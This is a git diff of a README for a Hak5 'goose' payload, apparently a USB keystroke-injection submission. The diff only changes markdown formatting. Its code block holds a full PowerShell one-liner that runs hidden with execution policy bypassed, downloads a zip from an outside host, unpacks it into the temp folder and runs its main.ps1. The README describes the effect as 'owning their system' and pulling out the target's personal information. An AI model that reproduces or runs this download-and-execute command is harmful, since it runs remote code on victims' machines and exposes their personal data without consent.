@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -41,9 +43,9 @@ Afterwards it will walk around your targets screen pulling out personal informat
 * Plug in your device
 * 10 seconds later your goose is owning their system
 
-```powershell
+<pre><code>
 powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
-```
+</code></pre>
 ### Exiting the Payload
 
 This payload will automatically end after 2 min 
